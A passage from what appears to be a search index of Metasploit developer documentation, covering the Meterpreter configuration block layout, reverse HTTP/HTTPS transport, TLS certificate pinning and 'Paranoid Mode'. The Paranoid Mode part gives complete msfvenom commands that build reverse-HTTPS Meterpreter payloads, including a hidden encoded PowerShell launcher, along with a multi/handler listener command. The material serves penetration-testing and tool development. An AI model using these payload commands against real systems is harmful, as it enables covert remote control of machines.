of the extension list and will stop parsing. The structure is simply laid out like the following: \u2009\u2009+--------------+ \u2009\u2009| Ext. Size | \u2009\u2009+--------------+ \u2009\u2009| Ext. content | \u2009\u2009+--------------+ \u2009\u2009| NULL term. | \u2009\u2009| (4 bytes) | \u2009\u2009+--------------+ Configuration Block Overview To summarise, the following shows the layout of a full configuration: \u2009\u2009+--------------+ \u2009\u2009|Socket\u2009Handle\u2009| \u2009\u2009+--------------+ \u2009\u2009| Exit func | \u2009\u2009+--------------+ \u2009\u2009|Session\u2009Expiry| \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009\u2009\u2009 UUID\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009|\u2009 Transport 1 | \u2009\u2009|\u2009\u2009tcp://...\u2009\u2009 | \u2009\u2009.\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009. \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009| Comms T/O | \u2009\u2009+--------------+ \u2009\u2009| Retry Total | \u2009\u2009+--------------+ \u2009\u2009| Retry Wait | \u2009\u2009+--------------+ \u2009\u2009|\u2009 Transport 2 | \u2009\u2009|\u2009\u2009http://...\u2009 | \u2009\u2009.\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009. \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009| Comms T/O | \u2009\u2009+--------------+ \u2009\u2009| Retry Total | \u2009\u2009+--------------+ \u2009\u2009| Retry Wait | \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009Proxy host | \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009Proxy user | \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009Proxy pass | \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009User agent | \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009 SSL cert | \u2009\u2009|\u2009\u2009 SHA1 hash | \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009NULL term. | \u2009\u2009|(1 or 2 bytes)| \u2009\u2009+--------------+ \u2009\u2009| Ext 1. Size | \u2009\u2009+--------------+ \u2009\u2009|Ext 1. content| \u2009\u2009+--------------+ \u2009\u2009| Ext 2. Size | \u2009\u2009+--------------+ \u2009\u2009|Ext 2. content| \u2009\u2009+--------------+ \u2009\u2009| NULL term. | \u2009\u2009+--------------+","title":"Meterpreter Configuration"},{"location":"dev/dark/Meterpreter-Configuration/#how-the-configuration-is-found","text":"In the past Meterpreter has required that the stager (or stage0 as some like to call it) pass in a handle to the active socket so that it can take over communications without creating a new socket (at least in the case of TCP connections). While this feature is still required, it doesn't happen in the way that it used to. Instead, Meterpreter now requires that the stager pass in a pointer to the start of the configuration block. The configuration block can be anywhere in memory, so long as the memory region is marked as RWX .","title":"How the configuration is found"},{"location":"dev/dark/Meterpreter-Configuration/#loading-configuration-in-windows-meterpreter","text":"Stage 1 of loading Windows Meterpreter now utilises a new loader, called meterpreter_loader ( Win x86 , Win x64 ), which does the following: Loads the metsrv DLL from disk. Patches the DOS header of the DLL so that it contains executable shellcode that correctly initialises metsrv and calculates the location that points to the end of metsrv in memory. It also takes any existing socket value (found in edi or rdi depending on the architecture) and writes that directly to the configuration (more on this later). Generates a configuration block and appends this to the metsrv binary. The result is that the payload has the following structure once it has been prepared: \u2009\u2009+--------------+ \u2009\u2009| Patched DOS | \u2009\u2009| header | \u2009\u2009+--------------+ \u2009\u2009| | \u2009\u2009. . \u2009\u2009. metsrv dll . \u2009\u2009. . \u2009\u2009| | \u2009\u2009+--------------+ \u2009\u2009| config block | \u2009\u2009+--------------+","title":"Loading configuration in Windows Meterpreter"},{"location":"dev/dark/Meterpreter-Configuration/#loading-configuration-in-posix-meterpreter","text":"POSIX Meterpreter functions in the same way, except that it doesn't have patched header that does the bootstrapping. The format of the payload is otherwise the same, and hence looks like this: \u2009\u2009+--------------+ \u2009\u2009| | \u2009\u2009. . \u2009\u2009. metsrv bin . \u2009\u2009. . \u2009\u2009| | \u2009\u2009+--------------+ \u2009\u2009| config block | \u2009\u2009+--------------+ TODO: confirm with @bcook-r7 that this is correct The structure of the configuration block is documented next.","title":"Loading configuration in POSIX Meterpreter"},{"location":"dev/dark/Meterpreter-Configuration/#configuration-block-structure","text":"In order to pass information to Meterpreter and not have it break, a known format of configuration is required. This format needs to be consistent on each invocation much like you would expect with any configuration. In the case of binary Meterpreter (POSIX and Windows), this configuration block contains the following: One Session configuration block. One or more Transport Configuration blocks, followed by a terminator. One or more Extension configuration blocks, followed by a terminator. Each of these blocks are described in detail in the sections below.","title":"Configuration Block Structure"},{"location":"dev/dark/Meterpreter-Configuration/#session-configuration-block","text":"The notion of a session configuration block is used to wrap up the following values: Socket handle - When Meterpreter is invoked with TCP communications, an active socket is already in use. This socket handle is intended to be reused by Meterpreter when metsrv executes. This socket handle is written to the configuration block on the fly by the loader. It is stored in the Session configuration block so that it has a known location. This value is always a 32-bit DWORD, even on 64-bit platforms. Exit func - This value is a 32-bit DWORD value that identifies the method that should be used when terminating the Meterpreter session. This value is the equivalent of the Block API Hash that represents the function to be invoked. Meterpreter used to delegate the responsibility of handling this to the stager that had invoked it. Meterpreter no longer does this, instead it handles the closing of the Meterpreter session by itself, and hence the chosen method for termination must be made known in the configuration. Session expiry value - This is a 32-bit DWORD that contains the number of seconds that the Meterpreter session should last for. While Meterpreter is running, this value is continually checked, and if the session expiry time is reached, then Meterpreter shuts itself down. For more information, please read the Timeout documentation (link coming soon). UUID - This is a 16-byte value that represents a payload UUID. A UUID is a new concept that has come to Metasploit with a goal of tracking payload type and origin, and validing that sessions received by Metasploit are intended for use by the current installation. For more information, please read the UUID documentation (link coming soon). The layout of this block in memory looks like this: \u2009\u2009+--------------+ \u2009\u2009|Socket\u2009Handle\u2009| \u2009\u2009+--------------+ \u2009\u2009| Exit func | \u2009\u2009+--------------+ \u2009\u2009|Session\u2009Expiry| \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009\u2009\u2009 UUID\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ | <- 4 bytes ->| With this structure in place, Meterpreter knows that the session configuration block is exactly 28 bytes in size. The Session configuration block description can be found in the Meterpreter source .","title":"Session configuration block"},{"location":"dev/dark/Meterpreter-Configuration/#transport-configuration-block","text":"The Transport configuration block is a term used to refer to the group of transport configurations that are present in the payload. Meterpreter now supports multiple transports, and so the configuration should support multiple transports too. There are two main issues when dealing with transport configurations: The configuration should allow for many transport configurations to be specified. The configuration should allow for each transport to be of a different type and size. Meterpreter's current transport implementations provide two main \"classes\" of transport, those being HTTP(S) and TCP . Each of these transport classes require different configuration values, as well as common values, in order to function.","title":"Transport configuration block"},{"location":"dev/dark/Meterpreter-Configuration/#common-configuration-values","text":"The values that are common to both HTTP(S) and TCP transports are: URL - This value is a meta-description of the transport and is used not only as a configuration element for the transport itself but also as a way of determining exactly what type of transport this block represents. The field is a total of 512 characters (Windows Meterpreter uses wchar_t , while POSIX Meterpreter uses char ). Transport types are specified by the scheme element in the URL, and the body of the URL specifies key information such as host and port information. Meterpreter inspects this to determine what type of transport block is in use, and hence from there is able to determine the size of the block. Valid values look like the following: tcp://<host>:<port> - indicates that this payload is a reverse IPv4 TCP connection. tcp6://<host>:<port>?<scope> - indicates that this payload is a reverse IPv6 TCP connection. tcp://:<port> - indicates that this payload is a bind payload listening on the specified port (note that no host is specifed). http://<host>:<port>/<uri> - indicates that this payload is an HTTP connection (can only be reverse ). https://<host>:<port>/<uri> - indicates that this payload is an HTTPS connection (can only be reverse ). Communications expiry - This value is another 32-bit DWORD value that represents the number of seconds to wait between successful packet/receive calls. For more information, please read the Timeout documentation (link coming soon). Retry total - This value is 32-bit DWORD value that represents the number of seconds that Meterpreter should continue to attempt to reconnect on this transport before giving up. For more information, please read the Timeout documentation (link coming soon). Retry wait - This value is 32-bit DWORD value that represents the number of seconds between each attempt that Meterpreter makes to reconnect on this transport. For more information, please read the Timeout documentation (link coming soon). The layout of this block in memory looks like the following: \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009\u2009\u2009 URL \u2009\u2009\u2009\u2009| \u2009\u2009.\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009. \u2009\u2009.\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009. 512 characters worth \u2009\u2009.\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009. (POSIX -> ASCII -> char) \u2009\u2009.\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009. (Windows -> wide char -> wchar_t) \u2009\u2009.\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009. \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009| Comms T/O | \u2009\u2009+--------------+ \u2009\u2009| Retry Total | \u2009\u2009+--------------+ \u2009\u2009| Retry Wait | \u2009\u2009+--------------+ | <- 4 bytes ->| The common transport configuration block description can be found in the Meterpreter source .","title":"Common configuration values"},{"location":"dev/dark/Meterpreter-Configuration/#tcp-configuration-values","text":"At this time, there are no TCP -specific configuration values, as the common configuration block caters for all of the needs of TCP transports. This may change down the track.","title":"TCP configuration values"},{"location":"dev/dark/Meterpreter-Configuration/#https-configuration-values","text":"HTTP and HTTPS connections have a number of extra configuration values that are required in order to make it function correctly in various environments. Those values are: Proxy host - In environments where proxies are required to be set manually, this field contains the detail of the proxy to use. The field is 128 characters in size ( wchar_t only, given that we don't yet have HTTP/S transport in POSIX), and can be in one of the following formats: http://<proxy ip>:<proxy port> in the case of HTTP proxies. socks=<socks ip>:<sock port> in the case of socks proxies. Proxy user name - Some proxies require authentication. In such cases, this value contains the username that should be used to authenticate with the given proxy. This field is 64 characters in size ( wchar_t ). Proxy password - This value will accompany the user name field in the case where proxy authentication is required. It contains the password used to authenticate with the proxy, and is also 64 characters in size ( wchar_t ). User agent string - Customisable user agent string. This changes the user agent that is used when HTTP/S requests are made to Metasploit. This field is 256 characters in size ( wchar_t ). Expected SSL certificate hash - Meterpreter has the capability of validating the SSL certificate that Metasploit presents when using HTTPS . This value contains the 20 -byte SHA1 hash of the expected certificate. For more information, please read the SSL certificate validation documentation (link coming soon). All values that are shown above need to be specified in the configuration, including SSL certificate validation for plain HTTP connections. Values that are not used should be zeroed out. The structure of the HTTP/S configuration is as follows. \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009Proxy host | \u2009\u2009.\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009. 128 characters worth (wchar_t) \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009Proxy user | \u2009\u2009.\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009. 64 characters worth (wchar_t) \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009Proxy pass | \u2009\u2009.\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009. 64 characters worth (wchar_t) \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009User agent | \u2009\u2009.\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009. 256 characters worth (wchar_t) \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009 SSL cert | \u2009\u2009|\u2009\u2009 SHA1 hash | \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ | <- 4 bytes ->| The HTTP/S transport configuration block description can be found in the Meterpreter source .","title":"HTTP/S configuration values"},{"location":"dev/dark/Meterpreter-Configuration/#transport-configuration-list","text":"As already mentioned, more than one of these transport configuration blocks can be specified. In order to facilitate this, Meterpreter needs to know when the \"list\" of transports has ended. Using the URL , Meterpreter can determine the size of the block, and can move to the next block depending on the type that is discovered. As soon as Meterpreter detects a transport configuration URL value that has a string length of zero (ie. a single NULL ASCII char in POSIX and a single NULL multi-byte char in Windows) it assumes that the transport list has been terminated. The byte immediately following this is deemed to be the start of the Extension configuration, which is documented in the next section.","title":"Transport configuration list"},{"location":"dev/dark/Meterpreter-Configuration/#extension-configuration-block","text":"The extension configuration block is designed to allow Meterpreter payloads to contain any extra extensions that the user wants to bundle in. The goal is to provide the ability to have Stageless payloads (link coming soon), and to provide the means for sharing of extensions during migration (though this hasn't been implemented yet). Each of the extensions must have been compiled with Reflective DLL Injection support, as this is the mechanism that is used to load the extensions when Meterpreter starts. For more information on this facility, please see the Stageless payloads (link coming soon) documentation. The extension configuration block also functions as a \"list\" to allow for an arbitrary number of extensions to be included. Each extension entry needs to contain the following: Size - This is the exact size, in bytes, of the extension DLL itself. The value is a 32-bit DWORD. Extension binary - This is the full binary directly copied from the DLL. This value needs to be exactly the same length as what is specified in the Size field. When loading the extensions from the configuration, Meterpreter will continue to parse entries until it finds a size value of 0 . At this point Meterpreter assumes it has reached the end of the extension list and will stop parsing. The structure is simply laid out like the following: \u2009\u2009+--------------+ \u2009\u2009| Ext. Size | \u2009\u2009+--------------+ \u2009\u2009| Ext. content | \u2009\u2009+--------------+ \u2009\u2009| NULL term. | \u2009\u2009| (4 bytes) | \u2009\u2009+--------------+","title":"Extension configuration block"},{"location":"dev/dark/Meterpreter-Configuration/#configuration-block-overview","text":"To summarise, the following shows the layout of a full configuration: \u2009\u2009+--------------+ \u2009\u2009|Socket\u2009Handle\u2009| \u2009\u2009+--------------+ \u2009\u2009| Exit func | \u2009\u2009+--------------+ \u2009\u2009|Session\u2009Expiry| \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009\u2009\u2009 UUID\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009|\u2009 Transport 1 | \u2009\u2009|\u2009\u2009tcp://...\u2009\u2009 | \u2009\u2009.\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009. \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009| Comms T/O | \u2009\u2009+--------------+ \u2009\u2009| Retry Total | \u2009\u2009+--------------+ \u2009\u2009| Retry Wait | \u2009\u2009+--------------+ \u2009\u2009|\u2009 Transport 2 | \u2009\u2009|\u2009\u2009http://...\u2009 | \u2009\u2009.\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009. \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009| Comms T/O | \u2009\u2009+--------------+ \u2009\u2009| Retry Total | \u2009\u2009+--------------+ \u2009\u2009| Retry Wait | \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009Proxy host | \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009Proxy user | \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009Proxy pass | \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009User agent | \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009 SSL cert | \u2009\u2009|\u2009\u2009 SHA1 hash | \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009NULL term. | \u2009\u2009|(1 or 2 bytes)| \u2009\u2009+--------------+ \u2009\u2009| Ext 1. Size | \u2009\u2009+--------------+ \u2009\u2009|Ext 1. content| \u2009\u2009+--------------+ \u2009\u2009| Ext 2. Size | \u2009\u2009+--------------+ \u2009\u2009|Ext 2. content| \u2009\u2009+--------------+ \u2009\u2009| NULL term. | \u2009\u2009+--------------+","title":"Configuration Block Overview"},{"location":"dev/dark/Meterpreter-HTTP-Communication/","text":"The Meterpreter payload supports a number of [[transport|Meterpreter Transport Control]], including reverse_http and reverse_https . This document describes how these transports work. The Initial URL During the generation process for a new reverse_http or reverse_https payload, an initial connect-back URL will be created. This URL will be either \"short\" or \"long\" and the 8-bit checksum of this URL will be set to one of the INIT_* constants defined in the UriChecksum mixin. The URL will be generated using the base64url character set. The \"short\" URL will always be 5 bytes in length while the \"long\" URL will be between 30 and 128 bytes in length. Which variant is used is determined by the space constraints of the exploit that generates the payload. The \"long\" URL can also include an embedded Payload UUID. The Connection URL The HTTP handler within Metasploit will receive the request for the initial URL, determine which INIT_* checksum it correlates to, extract any embedded [[Payload UUID]], and then respond with either the second stage for staged payloads or a new URL for stageless payloads. The new URL is generated by the handler, will embed any Payload UUID that was included in the original request, and will hash to the value defined by the URI_CHECKSUM_CONN constant. Note that characters other than the base64url character set are ignored during calculation of the checksum. The connect URL must be unique between sessions in order for the sessions to function properly. TLS Certificate Pinning The Meterpreter HTTPS transport supports certificate pinning. This applies to the stageless payloads as well as Meterpreter payloads loaded with the reverse_winhttps stagers. At this time, some of the non-Windows stagers also support certificate pinning, but this is still a work in progress. Certificate pinning is enabled by setting the StagerVerifySSLCert option to true and by extracting a SHA1 hash of the certificate specified in the HandlerSSLCert option. The SHA1 hash of the certificate will be verified during the staging process, and also in the handler, if these options are specified in the listener. This feature requires the pre-generation of a unified SSL/TLS certificate in PEM format, with the private key followed by one or more certificates in the chain. If an incoming session connects through a man-in-the-middle proxy that presents a different certificate, the first connection will connect back, but then immediately terminate. The handler will detect a non-responsive connection and close the session automatically. The command below generates a custom unified PEM TLS certificate that works with the HandlerSSLCert option: $ openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \\ -subj \"/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com\" \\ -keyout www.example.com.key \\ -out www.example.com.crt && \\ cat www.example.com.key www.example.com.crt > www.example.com.pem && \\ rm -f www.example.com.key www.example.com.crt The Application Protocol Once the Meterpreter connect URL is requested, the actual dispatch loop starts to run. The Meterpreter payload will make repeated requests with a HTTP body consistent of \"RECV\". Any queued commands will be returned to the payload, which will process them individually, and return the results in a following request. If no commands were returned as a result of a \"RECV\" request, the payload will double the interval until the next request, with a maximum that is generally about 10 seconds. Additional details about the configuration of the HTTP transport can be found on the [[transport control|Meterpreter Transport Control]] wiki page.","title":"Meterpreter HTTP Communication"},{"location":"dev/dark/Meterpreter-HTTP-Communication/#the-initial-url","text":"During the generation process for a new reverse_http or reverse_https payload, an initial connect-back URL will be created. This URL will be either \"short\" or \"long\" and the 8-bit checksum of this URL will be set to one of the INIT_* constants defined in the UriChecksum mixin. The URL will be generated using the base64url character set. The \"short\" URL will always be 5 bytes in length while the \"long\" URL will be between 30 and 128 bytes in length. Which variant is used is determined by the space constraints of the exploit that generates the payload. The \"long\" URL can also include an embedded Payload UUID.","title":"The Initial URL"},{"location":"dev/dark/Meterpreter-HTTP-Communication/#the-connection-url","text":"The HTTP handler within Metasploit will receive the request for the initial URL, determine which INIT_* checksum it correlates to, extract any embedded [[Payload UUID]], and then respond with either the second stage for staged payloads or a new URL for stageless payloads. The new URL is generated by the handler, will embed any Payload UUID that was included in the original request, and will hash to the value defined by the URI_CHECKSUM_CONN constant. Note that characters other than the base64url character set are ignored during calculation of the checksum. The connect URL must be unique between sessions in order for the sessions to function properly.","title":"The Connection URL"},{"location":"dev/dark/Meterpreter-HTTP-Communication/#tls-certificate-pinning","text":"The Meterpreter HTTPS transport supports certificate pinning. This applies to the stageless payloads as well as Meterpreter payloads loaded with the reverse_winhttps stagers. At this time, some of the non-Windows stagers also support certificate pinning, but this is still a work in progress. Certificate pinning is enabled by setting the StagerVerifySSLCert option to true and by extracting a SHA1 hash of the certificate specified in the HandlerSSLCert option. The SHA1 hash of the certificate will be verified during the staging process, and also in the handler, if these options are specified in the listener. This feature requires the pre-generation of a unified SSL/TLS certificate in PEM format, with the private key followed by one or more certificates in the chain. If an incoming session connects through a man-in-the-middle proxy that presents a different certificate, the first connection will connect back, but then immediately terminate. The handler will detect a non-responsive connection and close the session automatically. The command below generates a custom unified PEM TLS certificate that works with the HandlerSSLCert option: $ openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \\ -subj \"/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com\" \\ -keyout www.example.com.key \\ -out www.example.com.crt && \\ cat www.example.com.key www.example.com.crt > www.example.com.pem && \\ rm -f www.example.com.key www.example.com.crt","title":"TLS Certificate Pinning"},{"location":"dev/dark/Meterpreter-HTTP-Communication/#the-application-protocol","text":"Once the Meterpreter connect URL is requested, the actual dispatch loop starts to run. The Meterpreter payload will make repeated requests with a HTTP body consistent of \"RECV\". Any queued commands will be returned to the payload, which will process them individually, and return the results in a following request. If no commands were returned as a result of a \"RECV\" request, the payload will double the interval until the next request, with a maximum that is generally about 10 seconds. Additional details about the configuration of the HTTP transport can be found on the [[transport control|Meterpreter Transport Control]] wiki page.","title":"The Application Protocol"},{"location":"dev/dark/Meterpreter-Paranoid-Mode/","text":"In some scenarios, it pays to be paranoid. This also applies to generating and handling Meterpreter sessions. This document walks through the process of implementing a paranoid Meterpreter payload and listener. Create a SSL/TLS Certificate For best results, use a SSL/TLS certificate signed by a trusted certificate authority. Failing that, you can still generate a self-signed unified PEM using the following command: $ openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \\ -subj \"/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com\" \\ -keyout www.example.com.key \\ -out www.example.com.crt && \\ cat www.example.com.key www.example.com.crt > www.example.com.pem && \\ rm -f www.example.com.key www.example.com.crt Create a Paranoid Payload For this use case, we will combine [[Payload UUID]] tracking and whitelisting with TLS pinning . For a staged payload, we will use the following command: $ ./msfvenom -p windows/meterpreter/reverse_winhttps LHOST=www.example.com LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=./www.example.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f psh-cmd -o launch-paranoid.bat $ head launch-paranoid.bat %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcg... A [[stageless|Meterpreter Stageless Mode]] version of this would look like the following: $ ./msfvenom -p windows/meterpreter_reverse_https LHOST=www.example.com LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=./www.example.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless -f exe -o launch-paranoid-stageless.exe No platform was selected, choosing Msf::Module::Platform::Windows from the payload No Arch selected, selecting Arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 885314 bytes Saved as: launch-paranoid-stageless.exe Create a Paranoid Listener A staged payload would need to set the HandlerSSLCert and StagerVerifySSLCert options to enable TLS pinning and IgnoreUnknownPayloads to whitelist registered payload UUIDs: $ ./msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_winhttps; set LHOST www.example.com; set LPORT 443; set HandlerSSLCert ./www.example.com.pem; set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j' A stageless version is only slightly different: $ ./msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter_reverse_https; set LHOST www.example.com; set LPORT 443; set HandlerSSLCert ./www.example.com.pem; set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j'","title":"Meterpreter Paranoid Mode"},{"location":"dev/dark/Meterpreter-Paranoid-Mode/#create-a-ssltls-certificate","text":"For best results, use a SSL/TLS certificate signed by a trusted certificate authority. Failing that, you can still generate a self-signed unified PEM using the following command: $ openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \\ -subj \"/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com\" \\ -keyout www.example.com.key \\ -out www.example.com.crt && \\ cat www.example.com.key www.example.com.crt > www.example.com.pem && \\ rm -f www.example.com.key www.example.com.crt","title":"Create a SSL/TLS Certificate"},{"location":"dev/dark/Meterpreter-Paranoid-Mode/#create-a-paranoid-payload","text":"For this use case, we will combine [[Payload UUID]] tracking and whitelisting with TLS pinning . For a staged payload, we will use the following command: $ ./msfvenom -p 